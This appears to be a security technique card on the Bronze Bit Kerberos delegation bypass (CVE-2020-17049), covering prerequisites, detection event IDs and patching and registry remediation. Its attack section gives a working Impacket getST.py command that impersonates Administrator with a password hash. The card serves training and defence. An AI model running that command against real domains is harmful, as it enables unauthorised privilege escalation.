# [CA-KERB-008]: Bronze Bit Ticket Signing Bypass

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-008 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access / Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **CVE** | **CVE-2020-17049** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Exploiting a vulnerability in KDC signature validation (Bronze Bit). Attackers bypass the integrity check for the PAC during delegation (S4U2Self/S4U2Proxy) by flipping specific bits in the encrypted ticket. This allows them to bypass "Protected Users" restrictions or escalate privileges during delegation.
- **Attack Surface:** Constrained Delegation (S4U) flows.
- **Business Impact:** **Privilege Escalation**. Bypassing security controls intended to stop delegation abuse.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Service Account with Constrained Delegation enabled.
- **Vulnerable Config:** Unpatched DCs (pre-Nov 2020) or Registry `PerformTicketSignature` set to 0.
- **Tools:**
    - [Impacket (getST.py)](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Exploitation**
Request a Service Ticket via S4U2Self for a "Protected User" (normally blocked). The tool modifies the ticket bits to bypass the check.
```bash
# Impacket getST with -force-forwardable
getST.py -spn cifs/target.local -impersonate Administrator -hashes :HASH domain/user -force-forwardable
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Failure Code: `0xD` (KDC_ERR_BADOPTION) or `0x32` (KRB_AP_ERR_TKT_NYV) during S4U operations. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Patching:** Install updates for **CVE-2020-17049**.
*   **Registry:** Enforce strict ticket signature validation on DCs.
    `HKLM\System\CurrentControlSet\Services\Kdc\PerformTicketSignature = 1`

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-KERB-006]
> **Next Logical Step:** [LAT-AD-001]
